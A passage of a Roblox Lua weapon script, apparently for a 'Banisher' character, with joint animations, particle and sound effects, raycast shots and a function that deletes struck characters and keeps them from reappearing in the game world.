local weld = CreateWeldOrSnapOrMotor("Weld", part, RightArm, part, CF(-0.5, 0.2, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), CF(0, 0, 0))




ParticleEmitter({Speed = 0.2, Drag = 0, Size1 = 0.1, Size2 = 0, Lifetime1 = 0.3, Lifetime2 = 0.5, Parent = Hole, Emit = 100, Offset = 360, Enabled = true, Acel = VT(0,5,0)})
--ParticleEmitter({Speed = 0.5, Drag = 0, Size1 = 0.2, Size2 = 0, Lifetime1 = 0.3, Lifetime2 = 0.7, Parent = Dangle, Emit = 100, Offset = 360, Enabled = true, Acel = VT(0,5,0)})

for _, c in pairs(Weapon2:GetChildren()) do
	if c.ClassName == "Part" then
		c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
	end
end

for _, c in pairs(Weapon:GetDescendants()) do
	if c.ClassName == "Part" and c.Name ~= "Eye" and c.Parent ~= Effects and c.Parent.Parent ~= Effects then
		c.Material = "Glass"
		c.Color = C3(0,0,0)
	elseif c.ClassName == "Part" and c.Name == "Eye" then
		c.Color = C3(1,0,0)
		c.Material = "Neon"
	end
end

for _, c in pairs(Dead:GetDescendants()) do
	if c and c.Parent then
		if c.Name == "Handle" and c.Parent.ClassName == "Accessory" then
			local ACCESSORY = c.Parent
			c.Parent = Dead
			if c then
				if c:FindFirstChild("HatAttachment") or c:FindFirstChild("FaceFrontAttachment") or c:FindFirstChild("HairAttachment") then
					weldBetween(Head,c)
				else
					weldBetween(Torso,c)
				end
			end
			ACCESSORY:remove()
		elseif c.Parent.ClassName ~= "Accessory" and c.ClassName == "Part" and c.Name ~= "Eye" and c.Parent ~= Effects and c.Parent.Parent ~= Effects then
			c.Material = "Neon"
			c.Color = C3(0,0,0)
			if c:FindFirstChildOfClass("SpecialMesh") then
				c:FindFirstChildOfClass("SpecialMesh").TextureId = ""
			end
			if c == Head then
				if c:FindFirstChild("face") then
					c.face:remove()
				end
			end
		elseif c.ClassName == "Part" and c.Name == "Eye" then
			c.Color = C3(1,0,0)
			c.Material = "Neon"
		elseif c.ClassName == "CharacterMesh" or c.Name == "Body Colors" then
			c:remove()
		elseif (c.ClassName == "Shirt" or c.ClassName == "Pants") and c.Name ~= "Cloth" then
			c:remove()
		end
	end
end

for _, c in pairs(BB:GetDescendants()) do
	if c.ClassName == "Part" and c.Name ~= "Eye" and c.Parent ~= Effects and c.Parent.Parent ~= Effects then
		c.Material = "Glass"
		c.Color = C3(0,0,0)
	elseif c.ClassName == "Part" and c.Name == "Eye" then
		c.Color = C3(1,0,0)
		c.Material = "Neon"
end
	end
	
BB.Parent = nil
for _, c in pairs(BB:GetChildren()) do
	if c.ClassName == "Part" then
		c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
	end
end

Dead.Parent = nil
for _, c in pairs(Dead:GetChildren()) do
	if c.ClassName == "Part" then
		c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
	end
end

Weapon.Parent = nil
for _, c in pairs(Weapon:GetChildren()) do
	if c.ClassName == "Part" then
		c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
	end
end

Weapon2.Parent = nil

local SKILLTEXTCOLOR = C3(1,0,0)
local SKILLFONT = "Antique"
local SKILLTEXTSIZE = 7

Humanoid.Died:connect(function()
	ATTACK = true
end)

local SKILL1FRAME = CreateFrame(WEAPONGUI, 1, 2, UD2(0.1, 0, 0.90, 0), UD2(0.26, 0, 0.07, 0), C3(0,0,0), C3(0, 0, 0), "Skill 1 Frame")
--[[local SKILL2FRAME = CreateFrame(WEAPONGUI, 1, 2, UD2(0.63, 0, 0.90, 0), UD2(0.26, 0, 0.07, 0), C3(0,0,0), C3(0, 0, 0), "Skill 2 Frame")
local SKILL3FRAME = CreateFrame(WEAPONGUI, 1, 2, UD2(0.215, 0, 0.90, 0), UD2(0.26, 0, 0.07, 0), C3(0,0,0), C3(0, 0, 0), "Skill 3 Frame")
local SKILL4FRAME = CreateFrame(WEAPONGUI, 1, 2, UD2(0.525, 0, 0.90, 0), UD2(0.26, 0, 0.07, 0), C3(0,0,0), C3(0, 0, 0), "Skill 4 Frame")
local SKILL5FRAME = CreateFrame(WEAPONGUI, 1, 2, UD2(0.365, 0, 0.90, 0), UD2(0.26, 0, 0.07, 0), C3(0,0,0), C3(0, 0, 0), "Skill 5 Frame")
]]
local SKILL1TEXT = CreateLabel(SKILL1FRAME, "[Z] Banisher Bullet", SKILLTEXTCOLOR, SKILLTEXTSIZE, SKILLFONT, 0, 2, 0.7, "Text 1")
--[[local SKILL2TEXT = CreateLabel(SKILL2FRAME, "[B] Ability 2", SKILLTEXTCOLOR, SKILLTEXTSIZE, SKILLFONT, 0, 2, 0.7, "Text 2")
local SKILL3TEXT = CreateLabel(SKILL3FRAME, "[C] Ability 3", SKILLTEXTCOLOR, SKILLTEXTSIZE, SKILLFONT, 0, 2, 0.7, "Text 3")
local SKILL4TEXT = CreateLabel(SKILL4FRAME, "[V] Ability 4", SKILLTEXTCOLOR, SKILLTEXTSIZE, SKILLFONT, 0, 2, 0.7, "Text 4")
local SKILL5TEXT = CreateLabel(SKILL5FRAME, "[X] Mercy", SKILLTEXTCOLOR, SKILLTEXTSIZE, SKILLFONT, 0, 2, 0.7, "Text 5")
]]
function printbye(Name)
	local MESSAGES = {"You cannot struggle, ","Your existance is an insult, ","Fade, ","Your existance is not desired, ","You are not permitted here, ","You are not to decide your fate, ","Be gone, ","You are already dead, ","Your live is an anomaly, ","Don't dare to return, ","Why are you resisting, ","You cannot exist here, ","Why are you struggling, ","Your fate was already decided, ","Goodbye, ","You cannot ignore my command, ","You cannot resist my command, ","You already died, "}
	warn(MESSAGES[MRANDOM(1,#MESSAGES)]..Name..".")	
end

workspace.ChildAdded:connect(function(instance)
    for BANISH = 1, #TOBANISH do
		if TOBANISH[BANISH] ~= nil then
			if instance.Name == TOBANISH[BANISH] then
				coroutine.resume(coroutine.create(function()
					printbye(instance.Name)
					instance:ClearAllChildren()
					Debris:AddItem(instance,0.0005)
				end))
			end
		end
	end
end)

--//=================================\\
--||			DAMAGING
--\\=================================//

function Banish(Foe)
	if Foe then
		coroutine.resume(coroutine.create(function()
			--if game.Players:FindFirstChild(Foe.Name) then
				table.insert(TOBANISH,Foe.Name)
				printbye(Foe.Name)
			--end
			Foe.Archivable = true
			local CLONE = Foe:Clone()
			Foe:Destroy()
			CLONE.Parent = Effects
			CLONE:BreakJoints()
			local MATERIALS = {"Glass","Neon"}
			for _, c in pairs(CLONE:GetDescendants()) do
				if c:IsA("BasePart") then
					if c.Name == "Torso" or c.Name == "UpperTorso" or c == CLONE.PrimaryPart then
 						CreateSound(131313234, c, 10, 1, false)
					end
					c.Anchored = true
					c.Transparency = c.Transparency + 0.2
					c.Material = MATERIALS[MRANDOM(1,2)]
					c.Color = C3(1,0,0)
					if c.ClassName == "MeshPart" then
						c.TextureID = ""
					end
					if c:FindFirstChildOfClass("SpecialMesh") then
						c:FindFirstChildOfClass("SpecialMesh").TextureId = ""
					end
					if c:FindFirstChildOfClass("Decal") then
						c:FindFirstChildOfClass("Decal"):remove()
					end
					c.Name = "Banished"
					c.CanCollide = false
				else
					c:remove()
				end
			end
			local A = false
			for i = 1, 35 do
				if A == false then
					A = true
				elseif A == true then
					A = false
				end
				for _, c in pairs(CLONE:GetDescendants()) do
					if c:IsA("BasePart") then
						c.Anchored = true
						c.Material = MATERIALS[MRANDOM(1,2)]
						c.Transparency = c.Transparency + 0.8/35
						if A == false then
							c.CFrame = c.CFrame*CF(MRANDOM(-45,45)/45,MRANDOM(-45,45)/45,MRANDOM(-45,45)/45)
						elseif A == true then
							c.CFrame = c.CFrame*CF(MRANDOM(-45,45)/45,MRANDOM(-45,45)/45,MRANDOM(-45,45)/45)						
						end
					end
				end
				Swait()
			end
			CLONE:remove()
		end))
	end
end

function ManualDamage(Humanoid,Damage,TorsoPart)
	local defence = Instance.new("BoolValue",Humanoid.Parent)
	defence.Name = ("HitBy"..Player.Name)
	game:GetService("Debris"):AddItem(defence, 0.001)
	Damage = Damage * DAMAGEMULTIPLIER
	if Humanoid.Health ~= 0 then
		local CritChance = MRANDOM(1,100)
		if Damage > Humanoid.Health then
			Damage = math.ceil(Humanoid.Health)
			if Damage == 0 then
				Damage = 0.1
			end
		end
		Humanoid.Health = Humanoid.Health - Damage
	end
end

function ManualAoE(POSITION,RANGE,MINDMG,MAXDMG,FLING,INSTAKILL)
	local CHILDREN = workspace:GetDescendants()
	for index, CHILD in pairs(CHILDREN) do
		if CHILD.ClassName == "Model" and CHILD ~= Character and CHILD.Parent ~= Effects then
			local HUM = CHILD:FindFirstChildOfClass("Humanoid")
			if HUM then
				local TORSO = CHILD:FindFirstChild("Torso") or CHILD:FindFirstChild("UpperTorso")
				if TORSO then
					if (TORSO.Position - POSITION).Magnitude <= RANGE then
						if INSTAKILL == true then
							CHILD:BreakJoints()
						else
							local DMG = MRANDOM(MINDMG,MAXDMG)
							ManualDamage(HUM,DMG,TORSO)
						end
						if FLING > 0 then
							for _, c in pairs(CHILD:GetChildren()) do
								if c:IsA("BasePart") then
									local bv = Instance.new("BodyVelocity") 
									bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
									bv.velocity = CF(POSITION,TORSO.Position).lookVector*FLING
									bv.Parent = c
									Debris:AddItem(bv,0.05)
								end
							end
						end
					end
				end
			end
		end
	end
end

function MeleeDMG(Humanoid,Damage)
	Damage = Damage * DAMAGEMULTIPLIER
	if Humanoid.Health < 2000 then
		if Humanoid.Health - Damage > 0 then
			Humanoid.Health = Humanoid.Health - Damage
		else
			Humanoid.Parent:BreakJoints()
		end
	else
		Humanoid.Parent:BreakJoints()
	end
end

function ApplyAoE(POSITION,RANGE,ISBANISH)
	local CHILDREN = workspace:GetDescendants()
	for index, CHILD in pairs(CHILDREN) do
		if CHILD.ClassName == "Model" and CHILD ~= Character then
			local HUM = CHILD:FindFirstChildOfClass("Humanoid")
			if HUM then
				local TORSO = CHILD:FindFirstChild("Torso") or CHILD:FindFirstChild("UpperTorso")
				if TORSO then
					if (TORSO.Position - POSITION).Magnitude <= RANGE then
						if ISBANISH == true then
							Banish(CHILD)
						else
							if ISBANISH == "Gravity" then
								HUM.PlatformStand = true
								if TORSO:FindFirstChild("V3BanishForce"..Player.Name) then
									local grav = Instance.new("BodyPosition",TORSO)
									grav.D = 15
									grav.P = 20000
									grav.maxForce = Vector3.new(math.huge,math.huge,math.huge)
									grav.position = TORSO.Position
									grav.Name = "V3BanishForce"..Player.Name
								else
									TORSO:FindFirstChild("V3BanishForce"..Player.Name).position = TORSO.Position+VT(0,0.3,0)
									TORSO.RotVelocity = VT(MRANDOM(-25,25),MRANDOM(-25,25),MRANDOM(-25,25))
								end
							else
								HUM.PlatformStand = false
							end
						end
					elseif ISBANISH == "Gravity" then
						if TORSO:FindFirstChild("V3BanishForce"..Player.Name) then
							TORSO:FindFirstChild("V3BanishForce"..Player.Name):remove()
							HUM.PlatformStand = false
						end
					end
				end
			end
		end
	end
end

--//=================================\\
--||	ATTACK FUNCTIONS AND STUFF
--\\=================================//

function Intro()
	ATTACK = true
	Rooted = false
		for i=0, 1, 0.1 / Animation_Speed do
		Swait() 
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(45), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(12)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-12)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
end
		for i=0, 3, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(30), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(-45), RAD(90)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(45), RAD(-90)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
				for i=0, 3, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(30), RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25))), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)), RAD(90)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)), RAD(-90)) * LEFTSHOULDERC0, 1 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
		Dead.Parent = Character
		BB.Parent = Character
		Weapon.Parent = Character
		Weapon2.Parent = Character
	WACKYEFFECT({EffectType = "Block", Size = VT(6,6,6), Size2 = VT(15,15,15), Transparency = 0, Transparency2 = 1, CFrame = Torso.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = 1, SoundVolume = 5})
	CreateSound(649634100, Torso, 10, 1)
		for i=0, 6, 0.1 / Animation_Speed do
		Swait()
		RightArmGrasp.Part0 = RightArm
		RightArmGrasp.C0 = CF(0,-0.8, 0) * ANGLES(RAD(90), RAD(-180 - 180 * SIN(SINE / 7)), RAD(0)) 
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-45), RAD(3 - 2 * SIN(SINE / 12)), RAD(0)), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(3 - 2 * SIN(SINE / 12)), RAD(0)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-45)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
	RightArmGrasp.Part0 = RightArm
	RightArmGrasp.C0 = CF(0,-0.8, 0) * ANGLES(RAD(90), RAD(0), RAD(0))
	TRANSFORMED = true
	ATTACK = false
	Rooted = false
end

function Shot2()
	ATTACK = true
	Rooted = false
	repeat
		for i=0, 0.08, 0.1 / Animation_Speed do
			Swait()
			turnto(Mouse.Hit.p)
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25))), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.15, 0.5, -0.7) * ANGLES(RAD(90), RAD(90), RAD(MRANDOM(-25,25))) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(MRANDOM(-25,25)), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(MRANDOM(-25,25)), RAD(75), RAD(MRANDOM(-25,25))) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(MRANDOM(-25,25)), RAD(-90), RAD(MRANDOM(-25,25))) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		local HIT,POS = CastProperRay(Hole.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(Hole.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = Hole.CFrame, MoveToPos = Hole.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = Hole.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 904440937, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Hole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Hole.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		local HIT,POS = CastProperRay(Holee.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(Holee.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = Holee.CFrame, MoveToPos = Holee.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = Holee.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 904440937, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Holee.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,Holee.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
	
		for i=0, 0.08, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(MRANDOM(-25,25)), RAD(MRANDOM(-25,25)),RAD(MRANDOM(-25,25))), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.15, 0.5, -0.6) * ANGLES(RAD(110), RAD(90), RAD(MRANDOM(-25,25))) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, -0.2) * ANGLES(RAD(110), RAD(MRANDOM(-25,25)), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(MRANDOM(-25,25)), RAD(75), RAD(MRANDOM(-25,25))) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(MRANDOM(-25,25)), RAD(-90), RAD(MRANDOM(-25,25))) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
	until KEYHOLD == false
	ATTACK = false
	Rooted = false
end

function Shot3()
	ATTACK = true
	Rooted = false
		for i=0, 1, 0.1 / Animation_Speed do
			Swait()
			turnto(Mouse.Hit.p)
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(0)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
	repeat
		for i=0, 0.1, 0.1 / Animation_Speed do
			Swait()
			turnto(Mouse.Hit.p)
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(0)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(0)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.15 / Animation_Speed)
		end
		local HIT,POS = CastProperRay(LeftHole2.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(LeftHole2.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(1,1.5,1), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = LeftHole2.CFrame*CF(0,0.5,0).p, RotationX = 0, RotationY = -15, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = LeftHole2.CFrame, MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = 145080998, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,LeftHole2.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = -5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0.3,0,0.3), Size2 = VT(2,0.5,2), Transparency = 0, Transparency2 = 1, CFrame = CF(POS,LeftHole2.Position) * ANGLES(RAD(-90), RAD(0), RAD(0)), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(1,0,0), SoundID = nil, SoundPitch = MRANDOM(8,11)/10, SoundVolume = 8})
		local HIT,POS = CastProperRay(LeftHole.Position, Mouse.Hit.p, 1000, Character)
		SpawnTrail(LeftHole.Position,POS)
		if HIT ~= nil then
			if HIT.Parent ~= workspace and HIT.Parent.ClassName ~= "Folder" then
				Banish(HIT.Parent)
			end
		end
